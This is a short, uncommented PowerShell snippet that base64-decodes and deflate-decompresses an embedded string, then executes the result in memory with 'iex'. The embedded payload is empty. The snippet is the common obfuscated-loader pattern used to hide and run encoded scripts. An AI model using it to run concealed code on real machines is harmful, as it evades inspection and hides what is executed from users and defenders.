$data = [Convert]::FromBase64String("")
$decompressed = New-Object System.IO.MemoryStream
$compressStream = New-Object System.IO.Compression.DeflateStream([System.IO.MemoryStream]::new($data), [System.IO.Compression.CompressionMode]::Decompress)
$compressStream.CopyTo($decompressed)
$script = [System.Text.Encoding]::UTF8.GetString($decompressed.ToArray())
iex $script
